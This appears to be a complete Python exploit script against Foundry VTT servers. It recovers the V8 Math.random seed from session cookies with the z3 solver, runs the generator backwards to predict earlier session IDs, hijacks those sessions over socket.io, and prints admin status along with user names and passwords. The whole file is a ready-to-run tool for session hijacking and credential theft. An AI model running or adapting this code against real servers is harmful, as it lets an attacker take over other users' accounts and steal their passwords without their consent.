from __future__ import annotations

import os
import sys
import math
import string
import struct
import asyncio
from urllib.parse import urlparse
from dataclasses import dataclass
from typing import Tuple, Dict, List, Optional, Any, AsyncIterator
from functools import reduce
from contextlib import asynccontextmanager

import requests
import socketio
import numpy as np
from numpy import float64 as f64
from numpy import uint64 as u64
from z3 import BitVec
import z3

alpha = string.digits + string.ascii_lowercase

def b36dec(b36) -> f64:
    """
    v8 compatible base36 decode
    example input: kadp7602fln
    example output: 0.5635652429338152
    """
    return reduce(lambda a, x: f64(alpha.index(x) + a) / 36, reversed(b36), 0)


def b36enc(d: f64) -> str:
    """
    v8 compatible base36 encode
    example output: kadp7602fln
    example input: 0.5635652429338152
    """
    delta = f64(0.5) * (np.nextafter(d, 1) - d)
    # if d is a smoll boi
    delta = max(np.nextafter(f64(0), 1), delta)
    res = []
    i = 0
    while d >= delta:
        d *= 36
        delta *= 36
        x = math.floor(d)
        d -= x
        res.append(alpha[x])
        i += 1
        if ((d > 0.5 or (d == 0.5 and (x & 1))) and d + delta > 1):
            while True:
                i -= 1
                c = ord(res[i])
                x = c - ord('a') + 10 if c > ord('9') else c - ord('0')
                if (x + 1 < 36):
                    res[i] = alpha[x + 1]
                    i += 1
                    break
            break
    return ''.join(res)


def xs128p_z3(s0: BitVec, s1: BitVec) -> Tuple[BitVec, BitVec]:
    """z3 symbolic representation of xorshift128+"""
    s0 ^= s0 << 23
    s0 ^= z3.LShR(s0, 17)
    s0 ^= s1
    s0 ^= z3.LShR(s1, 26)
    return s1, s0


class Xs128pV8:
    """v8 xorshift128+ random number generator"""
    def __init__(self, s0: u64, s1: u64):
        self.s0 = s0
        self.s1 = s1

    @classmethod
    def cpy(cls, other: Xs128pV8):
        return cls(other.s0, other.s1)

    @staticmethod
    def xs128p_v8(s0: u64, s1: u64) -> Tuple[u64, u64]:
        """v8 xorshift128+ implementation"""
        s0 ^= s0 << u64(23)
        s0 ^= s0 >> u64(17)
        s0 ^= s1
        s0 ^= s1 >> u64(26)
        return s1, s0

    def shift(self):
        self.s0, self.s1 = Xs128pV8.xs128p_v8(self.s0, self.s1)

    def next(self) -> u64:
        x = self.s0
        self.shift()
        return x

    def next_f64(self) -> f64: return qd_v8(self.next())


class Xs128pV8Rev(Xs128pV8):
    """v8 xorshift128+ random number generator but reversed"""

    @staticmethod
    def xs128p_v8_rev(s0: u64, s1: u64) -> Tuple[u64, u64]:
        """v8 xorshift128+ implementation but in reverse"""
        s1 ^= s0 >> u64(26)
        s1 ^= s0
        s1 ^= s1 >> u64(17) ^ s1 >> u64(34) ^ s1 >> u64(51)
        s1 ^= s1 << u64(23) ^ s1 << u64(46)
        return s1, s0

    def shift(self):
        self.s0, self.s1 = Xs128pV8Rev.xs128p_v8_rev(self.s0, self.s1)


@dataclass
class ApproxFloat:
    """a float along with an approximation of how many bits may be inaccurate"""

    # recovered float
    val: float
    # loss in bits
    loss: int


def msk_loss(x: int, loss: int) -> int:
    """mask out `loss` last bits from x"""
    return x & ~((1 << loss) -1)


def add_z3(slv: z3.Solver, x: ApproxFloat, s0: BitVec, s1: BitVec):
    """add an approximated float to the formular"""
    s0, s1 = xs128p_z3(s0, s1)
    slv.add(msk_loss(z3.LShR(s0, 12), x.loss) == msk_loss(int(dq_v8(x.val)), x.loss))
    return s0, s1


def rid(rng: Xs128pV8, i: int) -> str:
    """generate a randomID like foundry does"""
    res = ''
    while len(res) < i: res += b36enc(rng.next_f64())
    return res[:i]


# decodes a whole rid into the 3 original floats
# the results specify how many bits are probably inaccurate
def dec_rid(b36) -> List[ApproxFloat]:
    """decode a rid into the original floats approximately"""
    def dec(loss): 
        """
        we decode the whole string into a single float.
        the result will be (close to) the first of the concatinated floats.
        then we reencode that float and get the size of the encoded value.
        we use that size to actually decode a b36 string which we cut out from
        the original string.
        then we advance the string by removing what we just decoded from the start 
        """
        nonlocal b36
        d = b36dec(b36[:len(b36enc(b36dec(b36)))])
        b36 = b36[len(b36enc(d)):]
        return ApproxFloat(d, loss)

    # always use a loss of `1` except for the last float
    # last float has 4 bits of accuracy for every b36 char
    return [dec(1), dec(1), dec(64 -(len(b36) * 4))]


# couple of conversions

def dq(d: f64) -> u64:
    """double to quad"""
    return u64(struct.unpack('<Q', struct.pack('d', float(d)))[0])

def dq_v8(d: f64) -> u64:
    """double to quad V8 version"""
    return dq(d +1) & u64(0xfffffffffffff)

def qd(q: u64) -> f64:
    """quad to double"""
    return f64(struct.unpack('d', struct.pack('<Q', q))[0])

def qd_v8(q: u64) -> f64:
    """quad to double V8 version"""
    return qd(q >> u64(12) | u64(0x3ff0000000000000)) -1


def recover_seed(tokens: List[str]) -> Optional[Tuple[u64, u64]]:
    """
    recovers the seed for a given set of session ids.
    the session tokens need to be passed in the correct order.
    usually 2 tokens are optimal, more are not necessarily benefitial.
    due to the token decoding inaccuracy, too many tokens are detrimental.
    """
    s0 = z3.BitVec('s0', 64)
    s1 = z3.BitVec('s1', 64)
    s0_ = s0
    s1_ = s1
    z3.set_option("parallel.enable", True)
    z3.set_option("parallel.threads.max", os.cpu_count())
    solver = z3.SolverFor("QF_BV")

    for t in reversed(tokens):
        for d in reversed(dec_rid(t)):
            s0, s1 = add_z3(solver, d, s0, s1)

    if solver.check() == z3.sat:
        m = solver.model()
        return (u64(m[s0_].as_long()), u64(m[s1_].as_long()))

    return None


def request_token(url: str) -> str:
    with requests.Session() as s:
        s.get(url)
        return s.cookies['session']


def prev_rid(rng: Xs128pV8Rev) -> str:
    """returns the previous rid"""
    # this is pretty awkward
    # because i have to generate the numbers in order
    # but then jump back to start of the previous number
    revrng = Xs128pV8.cpy(rng)
    sess = rid(rng, 24)
    # position at last rid
    for _ in range(3): revrng.shift()
    rng.s0, rng.s1 = revrng.s0, revrng.s1
    return sess


@dataclass
class Session:
    rid: str
    admin: bool
    user: Optional[Dict[str, Any]]

    def __repr__(self):
        res = f'rid: {self.rid}'
        if self.admin: res = f'admin! {res}'
        if self.user:
            res += f' uid: {self.user["userId"]}'
            u = next((u for u in self.user["result"] if u["_id"] == self.user["userId"]))
            res += f' name: {u.get("name")} password: {u.get("password")}'
        return res


@asynccontextmanager
async def ws(url: str, sess: str) -> AsyncIterator[socketio.AsyncClient]:
    sio = socketio.AsyncClient()
    url = url.rstrip('/')

    try:
        siopath = f'{urlparse(url).path}/socket.io'
        await sio.connect(f'{url}/socket.io/?session={sess}', socketio_path=siopath)
        yield sio
    finally: await sio.disconnect()


async def check_sess(url: str, s: str, active: bool) -> Optional[Session]:
    async with ws(url, s) as sio:
        # check if we're admin
        try: data = await sio.call('getSetupData', timeout=5)
        # session doesnt exist
        except: return None
        ud = None
        # if there is a game running
        if active:
            payload = {"type":"User","action":"get","data":{}}
            try: ud = await sio.call('modifyDocument', data=payload, timeout=5)
            # session is not a user
            except: pass

    return Session(s, data['isAdmin'], ud)


async def main(url: str):
    tk = request_token(url)
    
    async with ws(url, tk) as sio:
        data = await sio.call('getSetupData')
        # the `isSetup` variable is literally hardcoded to true lol
        active = await sio.call('getWorldStatus')
    # data = setup_data(url, tk)

    # print some server info
    print(f'server running foundry {data["version"]}')
    print(f'data path at {data["options"]["dataPath"]}')

    # do we even have an adminKey
    key = data['adminKey'] != ''
    if not key: print('there is no adminKey set!')
    if not active: print('server still in setup phase!')
    
    if not key and not active:
        print('no adminKey set and server in setup phase.')
        print('you should be able to just connect with any session :p')

    # if world is true, we can get the user datas

    while True:
        inp = [request_token(url), request_token(url)]
        check = request_token(url)

        print(f'trying with tokens: {inp}')
        res = recover_seed(inp) 
        if res:
            s0, s1 = res
            rng = Xs128pV8Rev(s0, s1)
            if rid(rng, 24) == check: break

    # throw away the first one as its actually the next one
    prev_rid(rng)
    print(f'found seed: {s0}:{s1}')
    print('looking for sessions')
    
    sessions = await asyncio.gather(*(check_sess(url, prev_rid(rng), active) for _ in
        range(64)))

    print('----')
    print('found following sessions:')
    for s in (s for s in sessions if s): print(s)
    try:
        usr = next((s.user["result"] for s in sessions if s and s.user))
        print('----')
        print('found following users:')
        for u in usr:
            print(f'uid: {u["_id"]} name: {u["name"]} password: {u["password"]} role: {u["role"]}')
    except: pass

if __name__ == '__main__':
    if not len(sys.argv) > 1: raise SystemExit('usage: python rnghax.py <foundry url>')
    asyncio.run(main(sys.argv[1]))
